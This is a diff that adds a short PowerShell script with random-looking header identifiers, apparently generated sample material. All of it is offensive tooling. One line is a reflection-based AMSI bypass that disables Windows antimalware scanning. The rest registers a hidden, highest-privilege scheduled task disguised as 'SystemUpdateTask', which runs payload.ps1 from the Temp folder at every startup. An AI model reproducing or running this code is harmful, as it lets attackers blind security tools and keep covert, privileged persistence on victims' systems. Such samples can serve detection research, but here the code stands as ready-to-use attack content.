@@ -1,0 +1,18 @@
+# ykHwgnCeOlINKwcX6Sxt
+# Generated: 2025-11-03T12:20:52.709744
+# System: nKDTP5Q0HbGKdMT
+# Process: uPKVhuc8BJM8
+
+
+# AMSI Bypass via Reflection
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+
+
+# Persistence via scheduled task
+$taskName = "SystemUpdateTask"
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Windows\Temp\payload.ps1"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
